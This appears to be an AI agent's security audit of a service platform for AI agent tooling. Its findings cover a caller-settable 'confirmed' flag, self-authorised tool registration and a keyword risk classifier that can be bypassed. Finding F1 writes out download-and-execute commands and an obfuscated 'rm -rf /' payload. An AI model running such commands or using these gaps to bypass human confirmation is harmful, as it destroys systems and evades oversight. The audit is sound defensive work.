# Specialist audit artifact

```text
Skill: hostile-business-logic-abuse-auditor
Agent: hostile-business-logic-abuse-auditor-workflow-agent
Scope: services/okf-synchroniser (proposal lifecycle, promotion thresholds), services/memory-intelligence
  (fact write/correct, SCOS_OKF_PROMOTION_* pre-filter and maybePromoteToOKF), services/tool-governance
  (tool lifecycle state machine, operation start/prepare), services/execution-proxy (risk classification,
  confirmation gate), services/autonomous-control-plane (routing/decision plan that drives tool-governance +
  execution-proxy), services/extension-manager (install/canary approval flow), services/mcp-gateway (external
  MCP tool exposure of the above), database/policies (RLS backstop for the above tables).

Files/components inspected:
  services/okf-synchroniser/cmd/server/proposals.go (full)
  services/okf-synchroniser/cmd/server/main.go (partial, requireRole/db wiring)
  services/memory-intelligence/cmd/server/main.go (Fact struct, handleFacts, handleFactCorrect,
    maybePromoteToOKF, resolveIdentity, lines 30-950)
  services/memory-intelligence/cmd/server/store.go (insertFact, correctFact, loadFacts*)
  services/tool-governance/cmd/server/main.go (full)
  services/tool-governance/cmd/server/store.go (registerTool, transitionTool, startOperation,
    completeOperation, loadTool*)
  services/execution-proxy/cmd/server/main.go (ExecuteRequest, planCommand, classifyRisk,
    destructive-confirmation check, toolGovernanceClient)
  services/autonomous-control-plane/cmd/server/main.go (dispatchTurn loop, buildPlan/routing,
    ConfirmationRequired derivation, lines ~400-500, ~1050-1150)
  services/autonomous-control-plane/cmd/server/classifier.go (classifyIntent, phraseIndicators,
    high_impact_action, explicit_risk_class)
  services/extension-manager/cmd/server/main.go (handleInstall, handleInstallDryRun,
    validateInstallManifest, verifySignature)
  services/extension-manager/cmd/server/canary.go (full)
  services/mcp-gateway/cmd/server/main.go (tool dispatch switch, tool schemas for scos_tool_*,
    scos_operation_*, scos_exec_*, scos_fact_*)
  database/policies/000001_rls.sql, 000003_data_plane_rls.sql (memory_items RLS policies)
  database/migrations/000001_initial.sql (ENABLE ROW LEVEL SECURITY statements)
  services/graphify-provider/cmd/server/main.go (ingestNode fact construction, for comparison)
  services/hermes-provider/cmd/server/lifecycle.go (grep only, fact route mapping)

Entry points inspected:
  POST /v1/facts (memory-intelligence, handleFacts) — not exposed as an mcp-gateway tool directly
    (no scos_remember case found), but reachable by any internal caller holding a valid identity/token
    (graphify-provider, hermes-provider, or any service with SCOS_INTERNAL_SERVICE_TOKEN).
  PATCH /v1/facts/{id} (memory-intelligence, handleFactCorrect) — exposed as scos_correct via mcp-gateway.
  POST /v1/proposals, /v1/proposals/{id}/{validate,diff,review,approve,reject,merge}
    (okf-synchroniser) — exposed via scos_okf_proposal_action / scos_okf_proposal_create (grep-confirmed
    route prefix; gateway wiring not re-verified line-by-line, assumed per docs/agent-connection-guide.md).
  POST /v1/tools/register, /v1/tools/transition, /v1/operations/start, /v1/operations/prepare
    (tool-governance) — exposed as scos_tool_register, scos_tool_transition, scos_operation_start,
    scos_operation_prepare via mcp-gateway (main.go:552-570), directly reachable by any external MCP client.
  POST /v1/execute, /v1/proxy/execute (execution-proxy, both routed to handleExecute) — exposed as
    scos_exec_execute via mcp-gateway (main.go:430-431, 1392-1405), including a client-settable "confirmed"
    boolean parameter in the external tool schema.
  POST /v1/extensions/install, /v1/extensions/{id}/canary(/resolve|/promote|/rollback) (extension-manager).

Important callers/callees:
  memory-intelligence.handleFacts -> insertFact (store.go) -> maybePromoteToOKF -> okf-synchroniser
    POST /v1/proposals (system:memory-intelligence-auto-promotion).
  memory-intelligence.handleFactCorrect -> correctFact (store.go, carries forward old.Authority/
    old.Confidence unchanged) -> maybePromoteToOKF.
  okf-synchroniser.reviewProposalAuthorized/decideProposal -> requireRole -> DB
    okf_governance_roles(principal_id, role, active) check.
  mcp-gateway scos_tool_register/scos_tool_transition -> tool-governance handleToolRegister/
    handleToolTransition -> store.registerTool/transitionTool (no role check, only tenant-scoped identity).
  mcp-gateway scos_operation_start -> tool-governance handleOperationStart (requires
    tool.State == StateAuthorised) -> startOperation.
  execution-proxy.toolGovernanceClient.AuthorizeAndPrepare -> tool-governance
    handleOperationPrepare (auto-registers + auto-authorises unknown tool_name "execution-proxy" on
    first bootstrap call; ToolProperties never consulted afterward to gate anything).
  autonomous-control-plane.dispatchTurn -> classifier.classifyIntent(req) -> buildPlan/route decision
    (confirmation := risk=="high"||risk=="critical"||class.has("high_impact_action")) ->
    tool-governance "/v1/operations/start" (tool_id = req.ProposedTool) and
    execution-proxy "/v1/proxy/execute" (command = req.ProposedTool, confirmed = !decision.ConfirmationRequired).
  execution-proxy.handleExecute -> planCommand -> classifyRisk(req.Command) (keyword prefix/substring
    match) -> destructive-and-not-Confirmed rejection (main.go:555-556).

Workflows traced:
  1. Fact write/correction -> auto OKF promotion: POST /v1/facts with client-controlled authority_level/
     confidence -> maybePromoteToOKF threshold pre-filter -> LLM classification -> okf-synchroniser
     proposal (still requires independent knowledge_curator approval to merge).
  2. Fact correction reusing borrowed trust: PATCH /v1/facts/{id} (scos_correct) -> correctFact carries
     forward old fact's Authority/Confidence onto brand-new attacker-supplied Content -> maybePromoteToOKF
     fires using the OLD fact's trust score against the NEW attacker content.
  3. Tool self-registration and self-authorization: scos_tool_register (state=proposed) ->
     scos_tool_transition (proposed->prepared, same principal) -> scos_tool_transition
     (prepared->authorised, same principal) -> scos_operation_start succeeds because
     tool.State==StateAuthorised.
  4. Bootstrap auto-authorization for ad hoc tools: execution-proxy's first-ever
     /v1/operations/prepare call for an unseen tool_name auto-registers AND auto-transitions straight to
     StateAuthorised with no review step at all (main.go:603-622).
  5. Confirmation-gate self-attestation and classifier bypass: scos_exec_execute exposes "confirmed" as a
     caller-settable boolean in the same request as "command"; classifyRisk() is a static
     keyword-prefix/substring blocklist that a plausible "download and execute" command (e.g. curl|bash,
     wget && ./x, python -c "os.system(...)" without the literal substring "rm ") does not match, so it is
     never classified "destructive" and the confirmation requirement never triggers at all.
  6. autonomous-control-plane routing: risk/ConfirmationRequired is derived from req.RiskClass
     (self-declared) and phrase-matching on req.Input (natural-language text), never from the actual
     req.ProposedTool value that becomes the literal command sent to execution-proxy's /v1/proxy/execute.
  7. Extension install/canary: manifest requires a valid ed25519 signature verified against
     SCOS_EXTENSION_SIGNING_PUBLIC_KEY, fails closed when the key or signature is missing/invalid;
     canaryStart/canaryFinish reuse the same signature gate — no bypass found here.

Trust boundaries:
  External MCP client (mcp-gateway :8098) -> internal services, authenticated only by bearer
    token/JWT claims, tenant/principal-scoped, not role-scoped for tool-governance actions.
  memory-intelligence resolveIdentity: JWT claims path is trustworthy; the header/body fallback path
    (auth.Identity(ctx) empty) trusts caller-supplied X-SCOS-Tenant-ID/X-SCOS-Principal-ID or body fields
    wholesale — relevant background for identity spoofing, out of this auditor's primary scope but adjacent
    to finding 2 below (see Suspicions).
  tool-governance / execution-proxy / okf-synchroniser: internal service token
    (SCOS_INTERNAL_SERVICE_TOKEN) plus tenant/principal claims; no distinct "approver" role concept exists
    in tool-governance at all (contrast with okf-synchroniser's requireRole).
  Postgres RLS (scos.tenant_id / scos.principal_id GUCs) as a defense-in-depth backstop behind
    application-level checks for memory_items; ENABLE ROW LEVEL SECURITY (not FORCE) is used, so RLS does
    not apply to the table owner/connecting role if the app connects as that role — not independently
    verified in this pass (see Coverage gaps).

Attacker-controlled inputs:
  Fact.Authority (authority_level) and Fact.Confidence (confidence) — fully client-supplied JSON fields on
    POST /v1/facts (main.go:60-61, decoded directly at handleFacts main.go:486-487), only clamped to
    [0,100]/[0,1], never independently computed.
  ExecuteRequest.Confirmed — client-supplied boolean, same request as Command, no independent
    confirmation channel.
  ExecuteRequest.Command / RouteRequest.ProposedTool — free-form attacker text, the actual payload
    risk-classified by a static keyword list.
  RouteRequest.RiskClass — client-declared risk label consumed directly into the
    confirmation-required decision (classifier.go:152-155, main.go:1071).
  tool_name / tool.Name registered via scos_tool_register — arbitrary attacker-chosen string, no signature
    or independent-approver requirement, unlike extension-manager's ed25519-signed manifests.

Invariants tested:
  "A fact's authority/confidence reflects genuine trust and gates auto-generated OKF proposals" — VIOLATED
    (client sets it directly on create; corrections keep the old fact's score against new content).
  "An OKF proposal always requires an independent reviewer distinct from the proposer before merge" — HELD
    (reviewProposalAuthorized rejects reviewer==proposer, requireRole enforces DB-backed role membership;
    the abuse surface above only reaches "proposal opened", never "proposal merged").
  "A governed tool moves from proposed to authorised only via independent review" — VIOLATED (no role/
    approver distinction exists anywhere in tool-governance's transition path).
  "Destructive/high-risk commands require explicit confirmation" — VIOLATED (confirmation is either
    self-attested by the same untrusted caller in the same request, or derived from a decoupled/incomplete
    heuristic that never inspects the command actually executed).
  "Extension installation is signature-gated and fails closed" — HELD.
  "Canary promotion is subject to the same signature gate as normal install, and cannot be used as a
    privileged side door" — HELD (explicit comment + validateInstallManifest reuse confirmed in code).

Findings:
  [F1 — Critical, Confirmed] execution-proxy's destructive-command confirmation gate is not a real
    approval control: (a) "confirmed" is a caller-supplied boolean accepted in the very same MCP call as
    the command itself (mcp-gateway scos_exec_execute schema, main.go:1404, forwarded verbatim to
    execution-proxy's ExecuteRequest.Confirmed, main.go:62); no distinct human-in-the-loop step or signed
    approval token exists anywhere in the path. (b) classifyRisk() (execution-proxy/main.go:939-969) is a
    static prefix/substring keyword blocklist; commands that achieve equivalent-or-worse impact without
    matching a keyword (e.g. `curl http://x/y|bash`, `wget http://x -O /tmp/z && /tmp/z`,
    `python3 -c "__import__('os').system(chr(114)+chr(109)+' -rf /')"`) are classified non-destructive and
    never require confirmation at all, regardless of the "confirmed" flag. Both defects are reachable
    end-to-end from the external MCP surface via the single scos_exec_execute tool.
  [F2 — High, Confirmed] tool-governance has no reviewer-distinct-from-proposer concept anywhere in its
    lifecycle. Any single authenticated tenant principal can, using only documented, externally-exposed MCP
    tools: scos_tool_register (creates state=proposed, no signature/role requirement,
    tool-governance/main.go:243-317) -> scos_tool_transition proposed->prepared -> scos_tool_transition
    prepared->authorised (both transitions performed by the same principal, main.go:319-400,
    canTransition only checks state-machine shape, never who is calling) -> scos_operation_start, which
    succeeds once tool.State==StateAuthorised (main.go:512-515). This contrasts directly with
    okf-synchroniser's explicit `reviewer == p.Proposer` rejection and DB-backed requireRole — tool-
    governance has no equivalent anywhere. The resulting "authorised" tool_id is also the exact input
    autonomous-control-plane forwards to tool-governance's /v1/operations/start as `tool_id` when a plan
    includes a tool-operation step (main.go:453-459), and req.ProposedTool is simultaneously used as the
    literal `command` string sent to execution-proxy's /v1/proxy/execute a few lines later
    (main.go:461-466) — the same client-supplied string plays both the "governed tool identity" role and
    the "shell command to run" role, with no independent authorization check binding one to the other.
  [F3 — Medium, Confirmed] autonomous-control-plane's ConfirmationRequired decision
    (classifier.go/main.go:1071: `risk=="high"||risk=="critical"||class.has("high_impact_action")`) is
    derived only from the client-declared RiskClass field and keyword/phrase matches against the
    natural-language req.Input string — never from req.ProposedTool, which is the value that actually
    becomes the executed command (main.go:464, `command: req.ProposedTool`). An attacker can phrase
    req.Input innocuously ("please run the helper script") while putting a destructive payload in
    proposed_tool, keeping RiskClass unset/low, causing ConfirmationRequired=false and therefore
    `confirmed: true` to be sent automatically to execution-proxy — leaving execution-proxy's own
    classifyRisk() (F1b) as the only remaining backstop, which is itself bypassable.
  [F4 — Medium, Confirmed] memory-intelligence's POST /v1/facts accepts Fact.Authority (authority_level)
    and Fact.Confidence directly from the request body with no server-side derivation (main.go:60-61,
    486-510; store.go:104-105 only clamps range, does not recompute). SCOS_OKF_PROMOTION_AUTHORITY_THRESHOLD
    / SCOS_OKF_PROMOTION_CONFIDENCE_THRESHOLD (memory-intelligence/main.go:336-337) is described in-code as
    "only a cheap pre-filter" (comment at main.go:769-786) with the real gate being the LLM classifier plus
    mandatory human OKF review before merge — so the ceiling of this finding is "attacker can force an LLM
    classification call and open an OKF review-queue proposal for arbitrary content at will, and can shape
    its category/slug via classifyForOKF's LLM output", not a merge bypass. Confirmed exploitable if any
    caller with fact-write access (an internal service using SCOS_INTERNAL_SERVICE_TOKEN, or a compromised/
    malicious agent holding tenant credentials with namespace can_write_candidates) supplies
    authority_level:100, confidence:1.0 on every fact regardless of actual provenance.
  [F5 — Medium, Confirmed] correctFact (memory-intelligence/store.go:308-349) preserves the *original*
    fact's Authority and Confidence onto the brand-new corrected Content (`Authority: old.Authority,
    Confidence: old.Confidence` at store.go:338-339) with no re-validation. Any principal in the same tenant
    who can reach PATCH /v1/facts/{id} (scos_correct — no ownership check beyond tenant match; getFact is
    tenant-scoped only, ordinary namespace can_write_candidates membership suffices) can "correct" a
    fact that was originally written with authority/confidence above the OKF promotion threshold, replacing
    its content with anything, and ride the borrowed trust score straight into maybePromoteToOKF
    (main.go:748) — i.e. content substitution under a pre-existing high-trust score, without ever needing to
    supply authority_level/confidence itself. This is strictly easier to trigger than F4 in an environment
    where raw fact creation is locked down but correction is not, and it means "authority/confidence" is
    effectively a property of the *fact slot*, not the specific claim text, once a correction occurs.

Suspicions requiring validation:
  memory_items has RLS ENABLE (not FORCE) with SELECT and INSERT policies only
    (database/policies/000001_rls.sql:28-34) — no UPDATE policy exists for memory_items anywhere in
    database/policies/. correctFact's `UPDATE memory_items SET status='superseded' ...` (store.go:351-356)
    and tool-governance's `transitionTool`/`completeOperation` UPDATE statements ignore RowsAffected
    entirely; if RLS actually blocks the UPDATE (i.e., the connecting DB role is not the table owner / RLS
    is FORCEd elsewhere not found in this pass), correction silently no-ops the "mark old fact superseded"
    step while still inserting the new fact as active, doubling active facts without erroring. If instead
    the connecting role *is* the table owner (default Postgres RLS bypass for owners when only ENABLE, not
    FORCE, is set), then the entire memory_items tenant-isolation RLS layer is inert for this service and
    only the application-level tenant_id filter in loadFacts* protects tenant isolation. Not independently
    confirmed which case applies — flagged as a coverage gap and handed to hostile-persistence-auditor /
    hostile-authorization-auditor territory.
  resolveIdentity's header/body fallback (memory-intelligence/main.go:280-301, tool-governance/main.go:122-144)
    trusts self-declared X-SCOS-Tenant-ID/X-SCOS-Principal-ID or JSON body tenant_id/principal_id whenever
    auth.Identity(ctx) is empty. Combined with F2/F4/F5, if this fallback is reachable from outside the
    trusted internal-service perimeter (not confirmed in this pass — likely gated earlier by
    auth.ControlPlaneHandler/AuthenticatedHandler requiring SCOS_INTERNAL_SERVICE_TOKEN or a valid JWT
    before auth.Identity(ctx) is ever populated), it would let a caller freely choose which tenant/principal
    "self-approves" its own tool or "corrects" facts as. Left to the authentication-identity auditor to
    confirm the outer gate's strictness.
  extension-manager has no visible tenant scoping on ExtensionManifest/Extension at all (single global
    s.extensions map, keyed only by PackageID) — any authenticated principal who can produce a validly
    signed manifest installs/replaces it system-wide across every tenant. Bounded by possession of the
    ed25519 signing key, so likely out of pure "business logic abuse" scope (it's an authorization/blast-
    radius question, not a legitimate-input-sequence abuse), but noted for the authorization auditor.
  Whether POST /v1/facts (fact creation, not correction) is reachable at all from the external MCP surface
    was not fully resolved — grep of mcp-gateway's tool-dispatch switch found no scos_remember/
    scos_fact_create case, only scos_correct/scos_forget/scos_fact_feedback/scos_fact_history. If fact
    creation is genuinely internal-only, F4's blast radius shrinks to internal/compromised-service callers;
    F5 (correction) remains externally reachable regardless via scos_correct.

Tests/commands executed:
  grep -rn "SCOS_OKF_PROMOTION_AUTHORITY_THRESHOLD\|CONFIDENCE_THRESHOLD" --include="*.go" (located the
    real threshold usage in services/memory-intelligence, not services/okf-synchroniser as the scope hint
    suggested).
  grep -n "authority_level\|Authority" across memory-intelligence/cmd/server/*.go (traced client-controlled
    field through insertFact/correctFact/maybePromoteToOKF).
  grep -n "case \"scos_" services/mcp-gateway/cmd/server/main.go (enumerated externally exposed tool
    dispatch to confirm reachability of scos_tool_register/transition, scos_operation_start/prepare,
    scos_exec_execute, scos_correct; confirmed absence of a fact-create tool case).
  grep -n "memory_items" database/policies/*.sql database/migrations/*.sql (confirmed SELECT+INSERT-only
    RLS policies and ENABLE-not-FORCE row level security).
  Read full services/tool-governance/cmd/server/main.go and store.go (confirmed no role/approver check
    anywhere in the transition or operation-start/prepare paths).
  Read full services/execution-proxy/cmd/server/main.go relevant sections (confirmed classifyRisk keyword
    list, confirmation short-circuit, toolGovernanceClient wiring, /v1/proxy/execute route aliasing).
  Read services/autonomous-control-plane/cmd/server/main.go dispatchTurn loop and classifier.go
    (confirmed ProposedTool dual-use and RiskClass/phrase-only confirmation derivation).
  Read services/extension-manager/cmd/server/main.go and canary.go in full (confirmed ed25519 signature
    verification is real and fail-closed; no bypass found).
  No test suite was executed (read-only investigation, no build/test environment set up in this pass).

Coverage gaps:
  Did not confirm whether the outer HTTP boundary in front of tool-governance/execution-proxy/
    memory-intelligence (auth.ControlPlaneHandler / auth.AuthenticatedHandler /
    packages/auth/middleware.go) strictly requires SCOS_INTERNAL_SERVICE_TOKEN or a valid JWT before any
    handler code runs, i.e. whether the header/body identity fallback in resolveIdentity is ever actually
    reachable by an external, unauthenticated-to-that-service caller versus only by already-trusted
    service-to-service callers that legitimately lack JWT claims. This materially changes the severity of
    F2/F4/F5 (tenant/principal spoofing on top of the missing-approver gaps) and was left to the
    authentication-identity auditor.
  Did not independently verify Postgres role/GRANT configuration (deploy/compose, migration scripts, or
    infra-as-code) to determine whether the connecting application role owns the RLS-protected tables
    (which would make ENABLE-not-FORCE RLS a no-op for that role). Flagged as a suspicion above, not
    confirmed.
  Did not trace scos_okf_proposal_create/scos_okf_proposal_action's exact mcp-gateway route mapping
    line-by-line (relied on tool-name grep and the "known context" background); the okf-synchroniser
    proposal endpoints themselves were read in full and their invariants (independent reviewer required,
    requireRole DB check, protected-branch + divergence check before merge) held up under inspection.
  Did not review services/synthesis, services/hermes-provider, or services/graphify-provider write paths
    into memory-intelligence beyond a single grep pass — graphify-provider's fact construction was spot-
    checked and found not attacker-exploitable for F4 (fixed confidence=1.0, no authority field set, so
    defaults to 0, well under the 90 threshold); hermes-provider's write path was not read in depth.
  Did not load-test or exploit-execute any finding (no live environment); all findings are static-analysis
    traced through exact call chains with file:line citations, not dynamically confirmed against a running
    stack.
  Did not review services/backup-manager's or docs/governance-audit-current.md's references to
    SCOS_OKF_* beyond the grep that located them (deploy/compose/docker-compose.yml,
    docs/governance-audit-current.md, GOVERNANCE.md) — those are documentation/deployment surfaces, not
    code paths, and were out of scope for this pass.

Areas explicitly not reviewed:
  services/synthesis (Dream-style merge/consolidation) internals.
  services/backup-manager, services/restore-test flows.
  services/adapter-* provider implementations besides graphify-provider (spot check only) and
    hermes-provider (grep only).
  packages/auth/middleware.go internals (claims validation, token issuance/revocation) — treated as a
    trust boundary, not audited in depth here per the "known context" note in the task.
  Full extension-manager handleExtensionByID (enable/disable/uninstall/rollback) and hooks dispatch code
    beyond install/canary — install and canary were the explicit scope-hint target and were reviewed in
    full; enable/disable/rollback lifecycle was not separately audited for business-logic invariants (e.g.
    whether disabling an extension that others depend on is blocked).

Recommended follow-up:
  F1: Require execution-proxy's confirmation to come from a source the caller cannot set in the same
    request — e.g. a separate, short-lived confirmation token issued after a distinct
    "plan"/"explain" call the caller must present back, or route all destructive-risk decisions through a
    human-reviewable queue. Replace/augment the keyword classifier with an allowlist-based or
    intent-execution-boundary model (e.g. disallow arbitrary shell composition, or classify by AST/parse
    rather than substring match) so download-and-execute and obfuscated payloads are not silently
    classified safe.
  F2: Add an explicit approver-distinct-from-registrant requirement to tool-governance's
    proposed->prepared->authorised transitions (mirroring okf-synchroniser's `reviewer == p.Proposer`
    check and DB-backed requireRole), or restrict scos_tool_transition to a governance-role principal only.
  F3: Feed req.ProposedTool (the actual command payload) into risk classification alongside req.Input,
    not just the natural-language description; do not let ConfirmationRequired default to false purely
    from absence of scary phrases in unrelated text.
  F4/F5: Stop accepting Fact.Authority/Fact.Confidence from request bodies; compute them server-side from
    verifiable provenance (source type, evidence, calling service identity) the way graphify-provider's
    fixed confidence:1.0/no-authority pattern already does for its own writes. For corrections, either
    recompute authority/confidence for the new content (at minimum require re-review before a corrected
    fact can itself trigger auto-promotion) or require the corrector to hold the same trust level the
    original writer held.
  Suspicions: confirm (a) RLS FORCE/owner status for memory_items and tool-governance's tables, and (b)
    that resolveIdentity's header/body fallback is unreachable from outside the trusted internal-service
    perimeter, ideally as an explicit assertion/test rather than by re-reading code each audit cycle.
```
